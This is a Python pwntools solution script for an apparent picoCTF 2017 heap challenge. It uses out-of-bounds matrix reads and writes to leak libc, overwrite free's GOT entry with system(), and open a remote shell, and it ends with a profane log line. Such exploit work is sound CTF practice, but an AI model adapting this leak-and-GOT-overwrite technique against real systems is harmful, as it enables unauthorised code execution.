
from pwn import *
import struct
import binascii

FREE_GOT     = 0x804a10c 
SETBUF_GOT   = 0x804a104
FREE_LIBC    = 0x76110     # pico: 0x76110, local: 0x712f0
SYSTEM_LIBC  = 0x3e3e0     # pico: 0x3e3e0, local: 0x3ada0

#p = process(["./matrix"])
p = remote("shell2017.picoctf.com", 39489)

def data2float(data):
    return struct.unpack("<f", struct.pack("<I", data))[0]

def float2data(data):
    return struct.unpack("<I", struct.pack("<f", data))[0]

def read_data(addr):
    p.sendline("set 0 2 0 " + str(data2float(addr))); retrieve()
    p.sendline("get 1 0 0"); retrieve()
    return float2data(float(retrieve().split(" = ")[-1].split("\n")[0]))

def write_data(addr, val):
    p.sendline("set 0 2 0 " + str(data2float(addr))); retrieve()
    p.sendline("set 1 0 0 " + str(data2float(val))); retrieve()

def retrieve():
    return p.recvuntil('Enter command:')

def main():

    # 1. create two matrices (#0 = to overwrite, #1 = victim struct)
    p.sendline("create 4 1"); retrieve()
    p.sendline("create 1 1"); retrieve()

    #
    # 2. get libc's free() address
    #    also calculate another addresses such as libc base & system

    # resolve free@plt for the first time
    p.sendline("create 2 2"); retrieve()
    p.sendline("destroy 2"); retrieve()

    FREE_ADDR   = read_data(FREE_GOT)
    LIBC        = FREE_ADDR - FREE_LIBC
    SYSTEM_ADDR = LIBC + SYSTEM_LIBC

    print("LIBC     : " + hex(LIBC))
    print("FREE     : " + hex(FREE_ADDR))
    print("SYSTEM   : " + hex(SYSTEM_ADDR))

    # 3. overwrite free() to system() in GOT table
    write_data(FREE_GOT, SYSTEM_ADDR)

    #
    # 4. game over
    #
    cmd = struct.unpack("<I", "sh\x00\x00")[0]
    write_data(SETBUF_GOT, cmd);                                 # overwrite setbuf address with "sh" data
    p.sendline("set 0 2 0 " + str(data2float(SETBUF_GOT)));      # overwrite m->data with SETBUF_GOT adddress
    p.sendline("destroy 1");                                     # trigger system()
    retrieve()
    log.info("Enjoy your shell, bitch! :)")
    p.interactive()

if __name__ == '__main__':
    main()